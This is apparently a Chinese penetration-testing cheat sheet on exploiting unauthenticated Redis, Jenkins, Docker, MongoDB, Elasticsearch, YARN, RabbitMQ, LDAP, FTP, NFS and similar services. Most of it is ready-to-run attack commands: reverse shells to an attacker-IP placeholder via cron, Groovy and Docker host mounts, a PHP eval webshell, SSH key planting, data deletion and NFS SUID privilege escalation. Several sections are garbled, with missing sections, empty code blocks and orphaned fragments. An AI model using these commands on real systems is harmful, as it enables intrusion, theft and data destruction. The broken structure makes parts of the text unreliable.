<h3 class="md-end-block md-heading"><span class="md-plain">1. Redis 未授权访问（默认端口 6379）</span></h3>
<h4 class="md-end-block md-heading md-focus"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">默认无密码验证，允许匿名登录；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">4.x/5.0.5 前版本支持通过主从复制加载恶意模块执行命令；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">高权限运行时可写入系统文件（如计划任务、SSH 密钥）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">计划任务反弹 Shell</span></strong></span></p>



```bash
# 本地监听端口
nc -lvp 4444  
# 连接目标Redis并写入任务
redis-cli -h 目标IP
set x "\n* * * * * bash -i >& /dev/tcp/攻击者IP/4444 0>&1\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">写入 SSH 公钥登录</span></strong></span></p>



```bash
# 本地生成密钥对
ssh-keygen -t rsa -P ''  
# 写入目标authorized_keys
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
redis-cli -h 目标IP -x set pub < foo.txt
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
# 登录目标
ssh -i id_rsa root@目标IP
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">写入 Webshell</span></strong></span></p>



```bash
redis-cli -h 目标IP
config set dir /var/www/html/  # Web目录路径
config set dbfilename shell.php
set webshell "<?php @eval($_POST['cmd']);?>"
save
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2. Jenkins 未授权访问（默认端口 8080）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">管理面板可直接执行系统命令；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">未启用认证时，攻击者可访问</span><span class="md-pair-s" spellcheck="false"><code>/manage</code></span><span class="md-plain">路径操控服务。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">执行系统命令反弹 Shell</span></strong></span> <span class="md-plain">访问</span><span class="md-pair-s" spellcheck="false"><code>http://目标IP:8080/script</code></span><span class="md-plain">，输入 Groovy 脚本：</span></p>



```groovy
"bash -i >& /dev/tcp/攻击者IP/4444 0>&1".execute()
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">写入 Webshell</span></strong></span></p>



```groovy
// 写入JSP木马到工作目录
new File("/var/lib/jenkins/workspace/shell.jsp").write('<% out.println("Hello"); %>')
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">3. MongoDB 未授权访问（默认端口 27017）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">默认无权限验证，允许匿名用户对数据库执行增删改查；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">绑定 0.0.0.0 时可被外网访问。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>


```bash
# 连接目标数据库
mongo 目标IP:27017  
# 查看数据库列表
show dbs  
# 访问敏感数据库（如user库）
use user  
# 查看用户数据
db.users.find()  
# 删除数据（高危）
db.users.remove({})
```

</li>

</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">

<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">获取系统环境信息</span></strong></span></p>



```bash

```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">连接服务执行操作</span></strong></span></p>



```bash

```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">5. Elasticsearch 未授权访问（默认端口 9200/9300）</span></h3>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">

</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>


```bash
# 查看节点信息
curl http://目标IP:9200/_nodes  
# 查看索引数据
curl http://目标IP:9200/敏感索引/_search  
# 删除索引（高危）
curl -X DELETE http://目标IP:9200/敏感索引
```


<h3 class="md-end-block md-heading"><span class="md-plain">6. Docker 未授权访问（默认端口 2375）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Docker API 可远程操控容器；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">未限制访问时，攻击者可创建容器挂载宿主机目录。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">列出容器并控制</span></strong></span></p>



```bash
# 查看容器列表
curl http://目标IP:2375/containers/json  
# 启动容器
curl -X POST http://目标IP:2375/containers/容器ID/start
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">挂载宿主机目录获取权限</span></strong></span></p>



```bash
# 创建挂载宿主机根目录的容器
curl -X POST -H "Content-Type: application/json" http://目标IP:2375/containers/create -d '{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "echo 'bash -i >& /dev/tcp/攻击者IP/4444 0>&1' > /mnt/var/spool/cron/root"],
  "HostConfig": {"Binds": ["/:/mnt"]}
}'
# 启动容器执行命令
curl -X POST http://目标IP:2375/containers/新容器ID/start
```


</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">8. Memcached 未授权访问（默认端口 11211）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">内存缓存系统，默认无权限控制；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">公网暴露时可被直接读取缓存中的敏感数据（如用户会话、数据库连接信息）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>


```bash
# 连接目标服务
telnet 目标IP 11211  
# 查看缓存中的键
stats items  
# 读取指定键的内容（如键名为user:session）
get user:session  
# 清空缓存（干扰服务）
flush_all
```

</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">登录管理后台</span></strong></span> <span class="md-plain">访问</span><span class="md-pair-s" spellcheck="false"><code>http://目标IP:8161/admin</code></span><span class="md-plain">，使用默认账号 admin/admin 登录，查看</span><span class="md-pair-s" spellcheck="false"><code>Queues</code></span><span class="md-plain">列表，发送包含恶意代码的消息（如触发消费端代码执行）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">文件上传 Getshell</span></strong></span> <span class="md-plain">利用</span><span class="md-pair-s" spellcheck="false"><code>/fileserver</code></span><span class="md-plain">接口上传 webshell（需路径遍历漏洞配合）：</span></p>



```bash
curl -X PUT http://目标IP:8161/fileserver/../webapps/api/shell.jsp --data-binary '<% out.println("Hello"); %>'
```

</ul>

```python
app_id = requests.post(url).json()["application-id"]
payload = {
    "application-id": app_id,
    "am-container-spec": {
        "commands": {"command": "bash -i >& /dev/tcp/攻击者IP/4444 0>&1"}
    }
}
requests.post("http://目标IP:8088/ws/v1/cluster/apps", json=payload)
```

<h3 class="md-end-block md-heading"><span class="md-plain"> 13. RabbitMQ 未授权访问（常见端口 15672、15692、25672）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">消息中间件，默认管理界面端口 15672（HTTP）、25672（AMQP 协议），15692（HTTPS，若启用）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">默认账号</span><span class="md-pair-s" spellcheck="false"><code>guest/guest</code></span><span class="md-plain">仅限本地访问，配置错误时可能允许远程登录；未设置认证时可直接操作队列。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">登录管理界面操作队列</span></strong></span> <span class="md-plain">访问</span><span class="md-pair-s" spellcheck="false"><code>http://目标IP:15672</code></span><span class="md-plain">，尝试用</span><span class="md-pair-s" spellcheck="false"><code>guest/guest</code></span><span class="md-plain">登录（若远程可访问）。成功后：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">查看队列列表：获取</span><span class="md-pair-s" spellcheck="false"><code>Queues</code></span><span class="md-plain">中存储的消息类型、数量等信息；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">发送恶意消息：向队列提交含恶意代码的消息（如触发消费端代码执行漏洞）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">删除关键队列：执行</span><span class="md-pair-s" spellcheck="false"><code>Delete</code></span><span class="md-plain">操作中断业务通信。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">通过 AMQP 协议远程操控</span></strong></span> <span class="md-plain">使用</span><span class="md-pair-s" spellcheck="false"><code>pika</code></span><span class="md-plain">（Python 库）连接 25672 端口，未授权时可直接发送 / 接收消息：</span></p>



```python
import pika
connection = pika.BlockingConnection(pika.ConnectionParameters('目标IP', 25672))
channel = connection.channel()
# 发送恶意消息到队列
channel.basic_publish(exchange='', routing_key='敏感队列名', body='恶意代码')
connection.close()
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">14. LDAP 未授权访问（默认端口 389、636）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">轻量级目录访问协议，用于存储用户信息、组织结构等；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">默认无认证机制，公网暴露时可被枚举敏感数据（如用户名、邮箱、权限组）。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">枚举目录信息</span></strong></span> <span class="md-plain">使用</span><span class="md-pair-s" spellcheck="false"><code>ldapsearch</code></span><span class="md-plain">工具查询目录结构：</span></p>



```bash
# 匿名查询所有数据
ldapsearch -x -h 目标IP -p 389 -b "dc=example,dc=com" "(objectClass=*)"
```


<p class="md-end-block md-p"><span class="md-plain">结果可能包含：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">用户列表：</span><span class="md-pair-s" spellcheck="false"><code>cn=user1,ou=users,dc=example,dc=com</code></span><span class="md-plain">及密码哈希；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">权限组：</span><span class="md-pair-s" spellcheck="false"><code>cn=admin,ou=groups,dc=example,dc=com</code></span><span class="md-plain">的成员信息。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">修改用户权限（配置不当场景）</span></strong></span> <span class="md-plain">若目录允许匿名写入，可添加用户到管理员组：</span></p>



```bash
ldapmodify -x -h 目标IP -D "cn=admin,dc=example,dc=com" -f add_admin.ldif
```


<p class="md-end-block md-p"><span class="md-plain">（</span><span class="md-pair-s" spellcheck="false"><code>add_admin.ldif</code></span><span class="md-plain">中定义将用户添加至</span><span class="md-pair-s" spellcheck="false"><code>admin</code></span><span class="md-plain">组的操作）</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">15. FTP 未授权访问（默认端口 21）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">文件传输协议，默认支持匿名登录（用户名</span><span class="md-pair-s" spellcheck="false"><code>anonymous</code></span><span class="md-plain">，密码任意）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">配置不当可导致敏感文件泄露或恶意文件上传。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">匿名登录下载敏感文件</span></strong></span> <span class="md-plain">使用</span><span class="md-pair-s" spellcheck="false"><code>ftp</code></span><span class="md-plain">命令或 FileZilla 连接：</span></p>



```bash
ftp 目标IP 21
# 用户名输入anonymous，密码留空
ftp> ls  # 列出共享目录
ftp> get 数据库备份.sql  # 下载敏感文件
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">上传恶意文件获取权限</span></strong></span> <span class="md-plain">若目录可写，上传反弹 shell 脚本（如</span><span class="md-pair-s" spellcheck="false"><code>shell.sh</code></span><span class="md-plain">）：</span></p>



```bash
ftp> put shell.sh  # 上传脚本至服务器
# 若服务器存在自动执行机制（如定时任务），脚本触发后反弹shell
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">16. NFS 未授权访问（常见端口 2049、20048）</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">漏洞特征</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">网络文件系统，用于共享目录；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">配置</span><span class="md-pair-s" spellcheck="false"><code>*(rw,no_root_squash)</code></span><span class="md-plain">时，所有主机可读写共享目录，甚至获取 root 权限。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">利用方式</span></h4>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">挂载共享目录窃取数据</span></strong></span></p>



```bash
# 查看共享目录
showmount -e 目标IP  # 输出：/data *(rw,no_root_squash)
# 挂载到本地
mount -t nfs 目标IP:/data /tmp/nfs
# 访问敏感文件
cat /tmp/nfs/企业财务数据.xlsx
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">通过</span><span class="md-pair-s" spellcheck="false"><code>no_root_squash</code></span><span class="md-plain">提权</span></strong></span> <span class="md-plain">在本地创建含 SUID 权限的恶意程序，上传至共享目录：</span></p>



```bash
gcc -o /tmp/nfs/shell shell.c  # shell.c含setuid(0)代码
chmod 4777 /tmp/nfs/shell
```


<p class="md-end-block md-p md-focus"><span class="md-plain">在目标服务器执行</span><span class="md-pair-s" spellcheck="false"><code>/data/shell</code></span><span class="md-plain md-expand">即可获取 root 权限。</span></p>
</li>
</ul>
